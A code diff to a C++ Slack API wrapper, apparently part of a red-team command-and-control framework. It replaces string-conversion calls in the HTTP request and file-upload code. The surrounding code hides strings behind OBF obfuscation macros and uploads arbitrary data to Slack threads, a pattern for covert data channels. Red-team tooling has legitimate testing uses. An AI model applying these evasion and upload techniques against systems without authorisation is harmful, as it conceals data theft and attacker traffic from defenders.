@@ -1,9 +1,11 @@
 #include "stdafx.h"
 #include "SlackApi.h"
+#include "Common/FSecure/CppTools/StringConversions.h"
 #include <random>
 #include <cctype>
 #include <algorithm>
 
+using namespace FSecure::StringConversions;
 
 FSecure::Slack::Slack(std::string const& token, std::string const& channelName)
 {
@@ -206,18 +208,18 @@ std::string FSecure::Slack::SendHttpRequest(std::string const& host, std::string
 {
 	while (true)
 	{
-		web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
+		web::http::client::http_client webClient(Convert<Utf16>(host), this->m_HttpConfig);
 		web::http::http_request request; // default request is GET
 
 		if (!data.empty())
 		{
 			request.set_method(web::http::methods::POST);
 
-			request.headers().set_content_type(utility::conversions::to_string_t(contentType));
-			request.set_body(utility::conversions::to_string_t(data));
+			request.headers().set_content_type(Convert<Utf16>(contentType));
+			request.set_body(Convert<Utf16>(data));
 		}
 
-		request.headers().add(OBF(L"Authorization"), OBF(L"Bearer ") + utility::conversions::to_string_t(this->m_Token));
+		request.headers().add(OBF(L"Authorization"), OBF(L"Bearer ") + Convert<Utf16>(this->m_Token));
 
 		web::http::http_response resp = webClient.request(request).get();
 
@@ -239,7 +241,7 @@ void FSecure::Slack::UploadFile(std::string const& data, std::string const& ts)
 {
 	std::string url = OBF_STR("https://slack.com/api/files.upload?") + OBF("&channels=") + this->m_Channel + OBF("&thread_ts=") + ts;
 
-	std::string encoded = utility::conversions::to_utf8string(web::http::uri::encode_data_string(utility::conversions::to_string_t(data)));
+	std::string encoded = Convert<Utf8>(web::http::uri::encode_data_string(Convert<Utf16>(data)));
 
 	std::string toSend = OBF("filename=test5&content=") + encoded;
 
